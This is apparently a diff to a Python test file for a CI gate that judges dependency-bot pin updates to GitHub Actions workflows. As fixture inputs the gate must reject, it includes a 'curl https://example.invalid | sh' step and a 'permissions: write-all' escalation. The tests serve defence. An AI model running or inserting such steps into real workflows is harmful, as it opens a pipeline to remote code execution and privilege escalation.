@@ -1,7 +1,7 @@
 """What a PR touches: the one-way paths, and a dependency bot's edits to
 the gate."""
 
-from harness import ONE_WAY, PR_DIFF, WROTE, G, S, mkpr, run
+from harness import ONE_WAY, PR_DIFF, WROTE, G, S, merged, mkpr, run
 
 
 # The module's one-way paths: CODEOWNERS, secrets and migrations are judged
@@ -42,15 +42,15 @@ PIN = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
 +      - uses: actions/checkout@2222222222222222222222222222222222222222 # v4.2.0
 """
 status = bump(PIN)
-assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
+assert "Dependency update, CI green" in status and merged(), (status, WROTE)
 for diff in (PIN + "+      - run: curl https://example.invalid | sh\n",
              PIN.replace("# v4.2.0", "# v4.2.0\n+    permissions: write-all")):
     status = bump(diff)
-    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
+    assert "Dependency update" not in status and not merged(), (status, WROTE)
 status = bump("")  # the diff couldn't be read
-assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
+assert "Dependency update" not in status and not merged(), (status, WROTE)
 status = bump(PIN, ".github/CODEOWNERS")
-assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (status, WROTE)
+assert "Dependency update" not in status and not merged(), (status, WROTE)
 # A repin replaces each `uses:` line in place: a step dropped for a
 # `uses:`-shaped line in a `run:` block isn't one, whatever its ref says.
 RUN_HEAD = """diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
@@ -65,7 +65,7 @@ for diff in (RUN_HEAD + "+          uses: actions/checkout@222222222222222222222
              RUN_HEAD + "+          uses: actions/checkout@2222222222222222222222222222222222222222\n",
              PIN.replace("+      - uses:", "+        uses:")):
     status = bump(diff)
-    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (diff, status, WROTE)
+    assert "Dependency update" not in status and not merged(), (diff, status, WROTE)
 # Several steps repinned together are each replaced in place, and merge.
 status = bump("""diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
 --- a/.github/workflows/ci.yml
@@ -76,7 +76,7 @@ status = bump("""diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.ym
 +      - uses: actions/checkout@2222222222222222222222222222222222222222 # v4.2.0
 +      - uses: actions/setup-node@4444444444444444444444444444444444444444 # v4.1.0
 """)
-assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
+assert "Dependency update, CI green" in status and merged(), (status, WROTE)
 # The file list names only a rename's new path: a rename out of .github/ or
 # a dormant workflow renamed in is read from the diff, and so is a workflow
 # whose mode alone changed; none of them is a repin.
@@ -88,9 +88,9 @@ for diff, path, change in (
         ("diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml\nold mode 100644\nnew mode 100755\n",
          ".github/workflows/ci.yml", "MODIFIED")):
     status = bump(diff, path, change)
-    assert "Dependency update" not in status and not any("pr merge" in x for x in WROTE), (diff, status, WROTE)
+    assert "Dependency update" not in status and not merged(), (diff, status, WROTE)
 # A rename elsewhere is read too, and merges.
 status = bump("diff --git a/src/a.rs b/src/b.rs\nsimilarity index 100%\nrename from src/a.rs\nrename to src/b.rs\n",
               "src/b.rs", "RENAMED")
-assert "Dependency update, CI green" in status and any("pr merge" in x for x in WROTE), (status, WROTE)
+assert "Dependency update, CI green" in status and merged(), (status, WROTE)
 print("gate edits: ok")
